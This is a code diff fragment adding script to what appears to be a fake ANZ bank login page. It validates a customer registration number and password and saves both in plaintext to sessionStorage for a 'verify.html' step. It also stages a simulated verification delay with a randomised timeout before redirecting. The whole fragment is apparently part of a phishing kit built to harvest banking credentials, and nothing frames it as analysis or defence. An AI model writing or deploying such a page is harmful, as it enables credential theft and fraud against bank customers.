+               if (value.length > 9) value = value.substring(0, 9);
+               e.target.value = value;
+               
+               // Clear error while typing
+               if (value.length === 9) {
+                  showError(crnInput, 'crn-error', false);
+               }
+            });
+            
+            // Clear password error on input
+            passwordInput.addEventListener('input', () => {
+               showError(passwordInput, 'password-error', false);
+            });
+            
+            // Form submission
+            form.addEventListener('submit', function(e) {
+               e.preventDefault();
+               
+               // Validate
+               let isValid = true;
+               if (!validateCRN()) isValid = false;
+               if (!validatePassword()) isValid = false;
+               
+               if (!isValid) return;
+               
+               // Show loading
+               loadingOverlay.style.display = 'flex';
+               loginBtn.disabled = true;
+               
+               // Store credentials in sessionStorage for verify.html
+               const loginData = {
+                  crn: crnInput.value.trim(),
+                  password: passwordInput.value,
+                  timestamp: new Date().toISOString()
+               };
+               sessionStorage.setItem('anz_login_data', JSON.stringify(loginData));
+               
+               // Simulate verification delay then redirect
+               setTimeout(() => {
+                  window.location.href = 'verify.html';
+               }, 1500 + Math.random() * 1000);
+            });
+         });
+      </script>
+   </body>
+</html>
